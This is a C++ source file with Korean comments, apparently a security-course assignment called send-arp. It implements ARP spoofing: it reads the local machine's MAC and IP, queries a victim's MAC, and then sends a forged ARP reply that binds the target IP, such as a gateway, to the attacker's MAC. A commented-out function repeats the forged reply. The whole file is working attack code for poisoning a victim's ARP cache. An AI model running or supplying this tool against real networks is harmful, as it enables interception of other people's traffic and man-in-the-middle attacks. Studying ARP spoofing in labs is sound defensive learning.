/*
*	ip, mac은 Mac, Ip 클래스를 사용해 선언 해 주자. (함수에서의 인자값, 리턴값도 이걸로 사용하자.)
*	키벨류로 값 비교를 많이 하기때문에 string이 아니라 꼭 몇 바이트 몇 바이트 확인하자 그게 빠르다
*	
*
*/
#include <cstdio>  // C 스타일 입출력 함수 제공
#include <pcap.h>  // 네트워크 패킷 캡처 및 송수신 라이브러리
#include <sys/socket.h> // 소켓 관련 함수 및 구조체 정의
#include <sys/ioctl.h>  // 네트워크 인터페이스 정보 제어용 함수
#include <net/if.h>     // 네트워크 인터페이스 정보 제공
#include <unistd.h>     // POSIX 표준 함수 제공
#include "ethhdr.h"     // Ethernet 헤더 구조체 정의
#include "arphdr.h"     // ARP 헤더 구조체 정의

#pragma pack(push, 1)  // 메모리 정렬방식 조정(패딩 제어) ,1 은 패딩없이 1바이트씩 정렬 네트워크 패킷 송수신시 패딩없이 직렬화로 송수신하기 위함
// Ethernet과 ARP 패킷을 합친 구조체 정의
struct EthArpPacket final {
    EthHdr eth_; // Ethernet 헤더
    ArpHdr arp_; // ARP 헤더
};
#pragma pack(pop) // 제어부 해제

struct ifreq ifr;           // 네트워크 인터페이스 정보를 저장하기 위한 구조체
uint8_t* attacker_mac;      // 공격자의 MAC 주소를 저장할 포인터
char* attacker_ip;          // 공격자의 IP 주소를 저장할 포인터

// 프로그램 사용법 출력 함수
void usage() { 
    printf("syntax: send-arp <interface> <sender IP> <target IP>\n");
    printf("sample: send-arp wlan0 192.168.0.2 192.168.0.1\n");
}

// 공격자의 MAC 주소를 가져오는 함수
void getAttackerMac(char* dev) { 
    int sock_d = socket(AF_INET, SOCK_DGRAM, 0); // 소켓 생성
    ifr.ifr_addr.sa_family = AF_INET;           // IPv4 주소 체계 설정
    strncpy(ifr.ifr_name, dev, IFNAMSIZ - 1);   // 인터페이스 이름 설정
    ioctl(sock_d, SIOCGIFHWADDR, &ifr);         // MAC 주소 가져오기
    attacker_mac = (uint8_t *)ifr.ifr_hwaddr.sa_data; // MAC 주소 저장
}

// 공격자의 IP 주소를 가져오는 함수
void getAttackerIP(char* dev) {
    int sock_d = socket(AF_INET, SOCK_DGRAM, 0); // 소켓 생성
    strncpy(ifr.ifr_name, dev, IFNAMSIZ - 1);    // 인터페이스 이름 설정
    ioctl(sock_d, SIOCGIFADDR, &ifr);           // IP 주소 가져오기
    attacker_ip = inet_ntoa(((struct sockaddr_in*)&ifr.ifr_addr)->sin_addr); // IP 주소 문자열로 변환
}

// ARP 요청 패킷을 생성 및 전송하는 함수
void sendArpRequest(char* dev, pcap_t* handle, uint32_t sender_ip) {
    EthArpPacket packet;  // Ethernet + ARP 패킷 구조체 생성
    
    // Ethernet 헤더 설정
    packet.eth_.dmac_ = Mac("ff:ff:ff:ff:ff:ff"); // 브로드캐스트 MAC 주소
    packet.eth_.smac_ = Mac(attacker_mac);        // 공격자의 MAC 주소
    packet.eth_.type_ = htons(EthHdr::Arp);       // Ethernet 타입: ARP

    // ARP 헤더 설정
    packet.arp_.hrd_ = htons(ArpHdr::ETHER);      // 하드웨어 타입: Ethernet
    packet.arp_.pro_ = htons(EthHdr::Ip4);        // 프로토콜 타입: IPv4
    packet.arp_.hln_ = Mac::SIZE;                // 하드웨어 주소 길이
    packet.arp_.pln_ = Ip::SIZE;                 // 프로토콜 주소 길이
    packet.arp_.op_ = htons(ArpHdr::Request);    // ARP 요청
    packet.arp_.smac_ = Mac(attacker_mac);       // 요청자 MAC 주소
    packet.arp_.sip_ = htonl(Ip(attacker_ip));   // 요청자 IP 주소
    packet.arp_.tmac_ = Mac("00:00:00:00:00:00");// 타겟 MAC 주소 (알 수 없음)
    packet.arp_.tip_ = Ip(sender_ip);            // 타겟 IP 주소

    // ARP 요청 패킷 전송
    int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
    if (res != 0) {
        fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
    }
}
//void startInfection(char* dev, pcap_t* handle, uint32_t sender_ip, u_char* infected_mac, uint32_t target_ip){ //Infection을 위한 arp reply 시작
//	EthArpPacket packet;
//	
//	packet.eth_.dmac_ = Mac(infected_mac);
//	packet.eth_.smac_ = Mac(attacker_mac);
//	packet.eth_.type_ = htons(EthHdr::Arp);
//
//	packet.arp_.hrd_ = htons(ArpHdr::ETHER);
//	packet.arp_.pro_ = htons(EthHdr::Ip4);
//	packet.arp_.hln_ = Mac::SIZE;
//	packet.arp_.pln_ = Ip::SIZE;
//	packet.arp_.op_ = htons(ArpHdr::Reply);
//	packet.arp_.smac_ = Mac(attacker_mac);
//	packet.arp_.sip_ = htonl(Ip(target_ip));
//	packet.arp_.tmac_ = Mac(infected_mac);
//	packet.arp_.tip_ = htonl(Ip(sender_ip));
//	/*패킷 sending*/
//	int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
//	if (res != 0) {
//		fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
//	}
//
//}
int main(int argc, char* argv[]) {
    // 인자 갯수 확인 및 사용법 출력
    if (argc != 4) {
        usage();
        return -1;
    }
    
    uint32_t sender_ip = inet_addr(argv[2]); // 전달받은 sender IP를 32비트 정수로 변환
    uint32_t target_ip = inet_addr(argv[3]); // 전달받은 target IP를 32비트 정수로 변환
    uint8_t* sender_mac;                     // sender의 MAC 주소 저장 변수

    char* dev = argv[1];                     // 네트워크 인터페이스 이름
    getAttackerMac(dev);                     // 공격자의 MAC 주소 가져오기
    getAttackerIP(dev);                      // 공격자의 IP 주소 가져오기

    char errbuf[PCAP_ERRBUF_SIZE];           // pcap 오류 메시지 저장 버퍼
    pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 1, errbuf); // 네트워크 인터페이스 열기
    if (handle == nullptr) {
        fprintf(stderr, "couldn't open device %s(%s)\n", dev, errbuf);
        return -1;
    }
    
    sendArpRequest(dev, handle, sender_ip);  // ARP 요청 패킷 전송

    // ARP 응답 패킷 수신 및 처리 루프
    while (true) {
        struct pcap_pkthdr* header;
        const u_char* packet;
        int res = pcap_next_ex(handle, &header, &packet); // 패킷 수신
        if (res == 0) continue;
        if (res == PCAP_ERROR || res == PCAP_ERROR_BREAK) {
            printf("pcap_next_ex return %d(%s)\n", res, pcap_geterr(handle));
            break;
        }

        EthArpPacket* recv_reply_packet = (struct EthArpPacket*)packet; // 받은 패킷을 ARP 패킷으로 캐스팅
        if (recv_reply_packet->eth_.type_ != htons(EthHdr::Arp)) continue; // ARP 패킷인지 확인
        if (recv_reply_packet->arp_.op_ != htons(ArpHdr::Reply)) continue; // ARP 응답인지 확인
        if (recv_reply_packet->arp_.sip_ != Ip(sender_ip)) continue;      // 타겟 IP와 일치하는지 확인
        
        sender_mac = (uint8_t*)(recv_reply_packet->eth_.smac()); // Sender MAC 주소 저장
        break;
    }

    // ARP Spoofing을 위한 ARP 응답 패킷 생성 및 전송
    EthArpPacket infect_packet;
    infect_packet.eth_.dmac_ = Mac(sender_mac);
    infect_packet.eth_.smac_ = Mac(attacker_mac);
    infect_packet.eth_.type_ = htons(EthHdr::Arp);
    infect_packet.arp_.hrd_ = htons(ArpHdr::ETHER);
    infect_packet.arp_.pro_ = htons(EthHdr::Ip4);
    infect_packet.arp_.hln_ = Mac::SIZE;
    infect_packet.arp_.pln_ = Ip::SIZE;
    infect_packet.arp_.op_ = htons(ArpHdr::Reply);
    infect_packet.arp_.smac_ = Mac(attacker_mac);
    infect_packet.arp_.sip_ = Ip(target_ip);
    infect_packet.arp_.tmac_ = Mac(sender_mac);
    infect_packet.arp_.tip_ = Ip(sender_ip);

    // ARP Spoofing 패킷 전송
    int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&infect_packet), sizeof(EthArpPacket));
    if (res != 0) {
        fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
    }

    pcap_close(handle); // pcap 핸들 닫기
    return 0;
}

